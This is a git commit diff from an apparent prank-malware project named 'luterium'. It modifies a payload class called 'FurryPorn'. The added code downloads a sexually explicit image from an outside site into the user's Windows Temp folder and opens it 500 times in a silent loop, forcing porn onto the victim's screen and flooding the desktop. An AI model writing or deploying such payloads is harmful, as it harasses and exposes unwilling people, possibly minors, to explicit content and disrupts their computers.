03d4305c76158fdfb131e60cf05cc36c08de8ca8
Peter <pedrohenriquebm1108@gmail.com>
2022-10-17 21:31:21 -0300

    FurryPorn now opens as an actual image not as a website.

--- src/main/java/dev/peter/luterium/features/FurryPorn.java
+++ src/main/java/dev/peter/luterium/features/FurryPorn.java
@@ -1,9 +1,11 @@
 package dev.peter.luterium.features;
 
-import dev.peter.luterium.Main;
 import dev.peter.luterium.payload.PayloadExecutor;
+import dev.peter.luterium.utils.FileUtil;
 
+import javax.imageio.ImageIO;
 import java.awt.*;
+import java.io.File;
 import java.net.URI;
 
 /**
@@ -13,11 +15,17 @@ import java.net.URI;
  */
 
 public class FurryPorn implements PayloadExecutor {
+    FileUtil fileUtil = new FileUtil();
+
+    File path = new File(System.getProperty("user.home") + "\\AppData\\Local\\Temp\\smx.png");
+
     @Override
     public void execute() throws Exception {
+        fileUtil.downloadFile("https://static1.e621.net/data/sample/93/68/9368cca139a855bd2d1322fab98d84e8.jpg", path);
+
         for(int i = 0; i < 500; i++) {
             try {
-                Desktop.getDesktop().browse(URI.create("https://static1.e621.net/data/sample/93/68/9368cca139a855bd2d1322fab98d84e8.jpg"));
+                Desktop.getDesktop().open(path);
             }
             catch (Exception exception) {}
         }
